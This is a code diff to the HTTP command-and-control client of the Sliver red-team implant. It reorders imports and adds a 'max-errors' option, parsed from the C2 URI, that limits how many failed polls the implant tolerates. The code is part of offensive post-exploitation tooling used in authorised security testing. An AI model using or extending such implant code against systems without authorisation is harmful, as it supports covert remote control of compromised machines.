@@ -21,10 +21,6 @@ package httpclient
 // {{if .Config.HTTPc2Enabled}}
 
 import (
-	// {{if .Config.Debug}}
-	"log"
-	// {{end}}
-
 	"bytes"
 	"context"
 	"crypto/tls"
@@ -33,13 +29,18 @@ import (
 	"io"
 	"io/ioutil"
 	insecureRand "math/rand"
-	"strings"
-
 	"net"
 	"net/http"
 	"net/url"
+	"strconv"
+	"strings"
 	"sync"
 	"time"
+
+	// {{if .Config.Debug}}
+	"log"
+
+	// {{end}}
 
 	"github.com/bishopfox/sliver/implant/sliver/cryptography"
 	"github.com/bishopfox/sliver/implant/sliver/encoders"
@@ -64,6 +65,7 @@ type HTTPOptions struct {
 	NetTimeout  time.Duration
 	TlsTimeout  time.Duration
 	PollTimeout time.Duration
+	MaxErrors   int
 
 	ProxyConfig   string
 	ProxyUsername string
@@ -84,10 +86,15 @@ func ParseHTTPOptions(c2URI *url.URL) *HTTPOptions {
 	if err != nil {
 		pollTimeout = time.Duration(30 * time.Second)
 	}
+	maxErrors, err := strconv.Atoi(c2URI.Query().Get("max-errors"))
+	if err != nil || maxErrors < 0 {
+		maxErrors = 10
+	}
 	return &HTTPOptions{
 		NetTimeout:  netTimeout,
 		TlsTimeout:  tlsTimeout,
 		PollTimeout: pollTimeout,
+		MaxErrors:   maxErrors,
 
 		ProxyConfig:   c2URI.Query().Get("proxy"),
 		ProxyUsername: c2URI.Query().Get("proxy-username"),
